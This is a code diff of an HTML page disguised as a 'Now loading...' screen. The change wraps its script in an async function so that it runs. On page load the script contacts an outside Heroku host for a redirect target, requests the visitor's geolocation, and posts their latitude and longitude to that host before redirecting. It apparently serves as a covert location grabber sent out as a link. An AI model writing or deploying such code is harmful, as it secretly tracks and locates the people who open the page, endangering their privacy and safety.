@@ -4,22 +4,24 @@
     <meta charset="utf-8">
     <title>Now loading...</title>
     <script type="text/javascript">
-      const res = await fetch("https://get-ip-nero.herokuapp.com/auth"), url = await res.json();
-      if(url.geo === 'true') {
-        navigator.geolocation.getCurrentPosition(async position => {
-          location.href = url.url;
-          await fetch("https://get-ip-nero.herokuapp.com/geo", {
-            method: 'POST',
-            mode: 'cors',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({lat: position.coords.latitude, lng: position.coords.longitude})
+      (async () => {
+        const res = await fetch("https://get-ip-nero.herokuapp.com/auth"), url = await res.json();
+        if(url.geo === 'true') {
+          navigator.geolocation.getCurrentPosition(async position => {
+            location.href = url.url;
+            await fetch("https://get-ip-nero.herokuapp.com/geo", {
+              method: 'POST',
+              mode: 'cors',
+              headers: {'Content-Type': 'application/json'},
+              body: JSON.stringify({lat: position.coords.latitude, lng: position.coords.longitude})
+            });
+          }, async () => {
+            location.href = url.url;
           });
-        }, async () => {
+        }else{
           location.href = url.url;
-        });
-      }else{
-        location.href = url.url;
-      };
+        };
+      })();
     </script>
   </head>
 </html>
